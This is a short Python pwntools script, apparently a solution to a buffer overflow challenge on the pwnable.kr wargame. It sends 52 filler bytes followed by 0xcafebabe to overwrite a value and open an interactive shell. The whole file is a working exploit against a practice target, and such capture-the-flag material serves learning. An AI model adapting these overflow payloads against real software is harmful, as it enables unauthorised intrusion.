from pwn import *
r=remote('pwnable.kr',9000)
r.sendline("A"*52+"\xbe\xba\xfe\xca")
# also can use pack() from pwntools
# r.sendline("A"*52 + pack(0xcafebabe))
r.interactive()
